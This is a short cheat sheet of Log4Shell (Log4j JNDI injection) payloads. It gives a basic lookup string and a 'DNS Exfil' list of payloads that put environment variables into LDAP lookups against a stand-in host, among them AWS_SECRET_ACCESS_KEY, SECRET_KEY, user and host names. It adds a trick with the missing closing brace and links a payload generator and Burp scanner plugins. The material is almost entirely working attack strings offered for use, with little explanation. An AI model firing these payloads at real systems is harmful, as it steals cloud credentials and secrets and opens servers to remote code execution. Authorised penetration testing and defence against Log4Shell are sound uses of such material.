## Basic payload
`${jndi:ldap://example.com/a}`

## DNS Exfil
```
${jndi:ldap://${env:JAVA_VERSION}.example.com/a}
${jndi:ldap://${sys:java.version}.example.com/a}
${jndi:ldap://${hostName}.example.com/a}
${jndi:ldap://${sys:java.vendor}.example.com/a}
${jndi:ldap://${env:user}.example.com/a}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.example.com}
${jndi:ldap://example.com/a${env:USER}}
${jndi:ldap://${env:SECRET_KEY}.example.com/}
```

## Omitting closing brace can lead to data exfil after "/" sign
`${jndi:ldap://example.com/`

## Payload generator
https://github.com/woodpecker-appstore/log4j-payload-generator

## Burp plugins
### Passive scanner checks
https://github.com/whwlsfb/Log4j2Scan

### Active scan check
https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f
